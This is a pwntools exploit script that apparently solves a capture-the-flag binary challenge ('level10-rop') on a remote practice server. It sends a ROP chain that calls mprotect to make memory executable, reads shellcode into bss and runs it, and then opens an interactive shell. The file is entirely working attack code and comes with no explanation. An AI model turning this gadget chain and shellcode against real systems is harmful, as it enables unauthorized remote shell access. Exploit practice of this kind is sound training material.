from pwn import *
context.log_level="debug"

#r=process("./level10-rop")
r=remote("pwn.sixstars.team",22010)

#print r.pid
#pause()

main=0x0804813A
bss=0x8048500

peax=0x0804819c
pebx=0x0804819e
pecx=0x080481a0
pedx=0x080481a2
exe=0x80481a4

r.recv()

sh='a'*0x30

sh+=p32(peax)+p32(0x7d)
sh+=p32(pebx)+p32(0x8048000)
sh+=p32(pecx)+p32(0x1000)
sh+=p32(pedx)+p32(7)
sh+=p32(exe)

sh+=p32(peax)+p32(0x3)
sh+=p32(pebx)+p32(0)
sh+=p32(pecx)+p32(bss)
sh+=p32(pedx)+p32(0x100)
sh+=p32(exe)
sh+=p32(bss)


r.sendline(sh)
r.recv()
sh1=asm(shellcraft.sh())
r.sendline(sh1)
r.interactive()
